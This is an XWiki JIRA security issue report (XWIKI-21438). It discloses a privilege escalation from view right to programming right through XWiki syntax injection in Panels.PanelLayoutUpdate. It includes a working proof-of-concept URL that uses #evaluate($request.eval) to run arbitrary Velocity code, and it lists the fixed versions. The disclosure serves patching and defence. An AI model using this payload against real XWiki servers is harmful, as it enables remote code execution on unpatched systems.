

[Log in](/login.jsp?os_destination=%2Fbrowse%2FXWIKI-21438)[Skip to main content](#main)[Skip to sidebar](#sidebar)Linked ApplicationsLoadingâ€¦[![XWiki.org JIRA](/s/-65z3d2/930000/8ws80b/_/jira-logo-scaled.png)](https://jira.xwiki.org/secure/MyJiraHome.jspa)

* [Dashboards](/secure/Dashboard.jspa "View and manage your dashboards")
* [Projects](/secure/BrowseProjects.jspa "View recent projects and browse a list of projects")
* [Issues](/issues/ "Search for issues and view recent issues")

* Give feedback to Atlassian
* [Help](https://docs.atlassian.com/jira/jcore-docs-093/ "Help")
  + [Jira Core help](https://docs.atlassian.com/jira/jcore-docs-093/ "Go to the online documentation for Jira Core")
  + [Keyboard Shortcuts](/secure/ViewKeyboardShortcuts%21default.jspa "Get more information about Jira's Keyboard Shortcuts")
  + [About Jira](/secure/AboutPage.jspa "Get more information about Jira")
  + [Jira Credits](/secure/credits/AroundTheWorld%21default.jspa "See who did what")
* [Log In](/login.jsp?os_destination=%2Fbrowse%2FXWIKI-21438)

![Uploaded image for project: 'XWiki Platform'](https://jira.xwiki.org/secure/projectavatar?pid=10010&avatarId=13602)

1. [XWiki Platform](/browse/XWIKI)
2. [XWIKI-21438](/browse/XWIKI-21438)

# Remote code execution from view right on Panels.PanelLayoutUpdate

[Log In](/login.jsp?os_destination=%2Fbrowse%2FXWIKI-21438 "Log In")ClosedExportnull

XMLWordPrintable
#### Details

* **Type:**
  ![](/secure/viewavatar?size=xsmall&avatarId=13503&avatarType=issuetype "Bug - A problem which impairs or prevents the functions of the product.") Bug
* **Resolution:**
  Solved By
* **Priority:**
  ![](/images/icons/priorities/blocker.svg "Blocker - Blocks development and/or testing work, production could not run.") Blocker
* **Fix Version/s:**
  [15.9-rc-1](/issues/?jql=project+%3D+XWIKI+AND+fixVersion+%3D+15.9-rc-1 "15.9-rc-1 "), [15.5.4](/issues/?jql=project+%3D+XWIKI+AND+fixVersion+%3D+15.5.4 "15.5.4 "), [14.10.19](/issues/?jql=project+%3D+XWIKI+AND+fixVersion+%3D+14.10.19 "14.10.19 ")
* **Affects Version/s:**
  3.2 M1
* **Component/s:**
  [Panels](/issues/?jql=project+%3D+XWIKI+AND+component+%3D+Panels "Panels ")
* **Labels:**
  + [attack\_escalation](/issues/?jql=labels+%3D+attack_escalation "attack_escalation")
  + [attacker\_view](/issues/?jql=labels+%3D+attacker_view "attacker_view")
  + [security](/issues/?jql=labels+%3D+security "security")

* **Tests:**
  Unit
* **Difficulty:**
  Unknown
* **Documentation:**
  N/A
* **Documentation in Release Notes:**
  N/A
* **Similar issues:**

#### Description

**Steps to reproduce:**

As guest or logged-in user without wiki admin right, open <xwiki-host>/xwiki/bin/view/Panels/PanelLayoutUpdate?place=%7B%7B%2Fhtml%7D%7D%7B%7Basync%20async%3Dfalse%7D%7D%7B%7Bvelocity%7D%7D%23evaluate(%24request.eval)%7B%7B%2Fvelocity%7D%7D%7B%7B%2Fasync%7D%7D&eval=Hello%20from%20URL%20Parameter!%20I%20got%20programming%3A%20%24services.security.authorization.hasAccess(%27programming%27) where <xwiki-host> is the URL of your XWiki installation.

**Expected result:**

A message

```
You are not admin on this place {{/html}}{{async async=false}}{{velocity}}#evaluate($request.eval){{/velocity}}{{/async}}.
```

is displayed:

[![](https://jira.xwiki.org/secure/thumbnail/41814/_thumb_41814.png)](/secure/attachment/41814/41814_image-2023-10-17-14-06-46-001.png "image-2023-10-17-14-06-46-001.png")

**Actual result:**

The message

```
You are not admin on this place Hello from URL Parameter! I got programming: true.</p>
          </div>  </div>{{/html}}

```

is displayed:

[![](https://jira.xwiki.org/secure/thumbnail/41815/_thumb_41815.png)](/secure/attachment/41815/41815_image-2023-10-17-14-05-28-773.png "image-2023-10-17-14-05-28-773.png")

This demonstrates a privilege escalation from view right on Panels.PanelLayoutUpdate - by default visible for guests - to programming right due to XWiki syntax injection. Note that while the XWiki syntax is subject to HTML escaping, the above URL demonstrates how to circumvent this limitation by using #evaluate($request.eval). With this trick, arbitrary Velocity code can be executed. The same attack vector also allows to execute Groovy code but with the same limitation of HTML escaping. Again, evaluation can be used to circumvent the limitation in case it should be an issue.

This vulnerability most likely exists since XWiki 3.2 M1 when, as part of, [~~XWIKI-6504~~](https://jira.xwiki.org/browse/XWIKI-6504 "Convert Panels application into syntax 2.0") this code was [converted](https://github.com/xwiki/xwiki-platform/commit/2e4b54267b9bf4048c14fdf14b6a0a65236aabad#diff-06296131d1a89513e9c8a2322ad1e602fcccbf7bee5732689b754a8e3de7b43b) to XWiki syntax 2.0.

#### Attachments

#### Attachments

* Options
  + [Sort By Name](/browse/XWIKI-21438?attachmentSortBy=fileName#attachmentmodule "viewissue.subtasks.tab.show.all.name")
  + [Sort By Date](/browse/XWIKI-21438?attachmentSortBy=dateTime#attachmentmodule "Sort By Date")
  + [Ascending](/browse/XWIKI-21438?attachmentOrder=asc#attachmentmodule "Ascending")
  + [Descending](/browse/XWIKI-21438?attachmentOrder=desc#attachmentmodule "Descending")
  + [Thumbnails](/browse/XWIKI-21438?attachmentViewMode=gallery#attachmentmodule "Thumbnails")
  + [List](/browse/XWIKI-21438?attachmentViewMode=list#attachmentmodule "List")
  + [Download All](/secure/attachmentzip/72267.zip "Download all attachments as a ZIP file")

1. [![image-2023-10-17-14-05-28-773.png](https://jira.xwiki.org/secure/thumbnail/41815/_thumb_41815.png)](/secure/attachment/41815/image-2023-10-17-14-05-28-773.png "image-2023-10-17-14-05-28-773.png - Latest 17/Oct/23 14:05 - Michael Hamann")[image-2023-10-17-14-05-28-773.png](/secure/attachment/41815/image-2023-10-17-14-05-28-773.png "image-2023-10-17-14-05-28-773.png - Latest 17/Oct/23 14:05 - Michael Hamann")16 kB17/Oct/23 14:05
2. [![image-2023-10-17-14-06-46-001.png](https://jira.xwiki.org/secure/thumbnail/41814/_thumb_41814.png)](/secure/attachment/41814/image-2023-10-17-14-06-46-001.png "image-2023-10-17-14-06-46-001.png - Latest 17/Oct/23 14:06 - Michael Hamann")[image-2023-10-17-14-06-46-001.png](/secure/attachment/41814/image-2023-10-17-14-06-46-001.png "image-2023-10-17-14-06-46-001.png - Latest 17/Oct/23 14:06 - Michael Hamann")14 kB17/Oct/23 14:06
#### Issue Links

is related to

![Bug - A problem which impairs or prevents the functions of the product.](/secure/viewavatar?size=xsmall&avatarId=13503&avatarType=issuetype "Bug - A problem which impairs or prevents the functions of the product.")
[XCOMMONS-2828](/browse/XCOMMONS-2828)
$escapetool.html doesn't escape {, allowing XWiki syntax injection

* ![Blocker - Blocks development and/or testing work, production could not run.](/images/icons/priorities/blocker.svg "Blocker - Blocks development and/or testing work, production could not run.")
* Closed

#### Activity

#### People

Assignee:

![pjeanjean](https://jira.xwiki.org/secure/useravatar?size=small&avatarId=10222)
Pierre Jeanjean

Reporter:

![MichaelHamann](https://jira.xwiki.org/secure/useravatar?size=small&avatarId=10222)
Michael Hamann

Votes:
0
Vote for this issue

Watchers:
1
Start watching this issue

#### Dates

Created:

17/Oct/23 14:29

Updated:

10/Apr/24 10:35

Resolved:

20/Oct/23 17:52

* Atlassian Jira [Project Management Software](https://www.atlassian.com/software/jira)
* [About Jira](/secure/AboutPage.jspa/secure/AboutPage.jspa)
* [Report a problem](/secure/CreateIssue%21default.jspa)

Powered by a free Atlassian [Jira](http://www.atlassian.com/software/jira) open source license for XWiki.org. Try Jira - [bug tracking software](http://www.atlassian.com/software/jira) for *your* team.

[Atlassian](http://www.atlassian.com/)

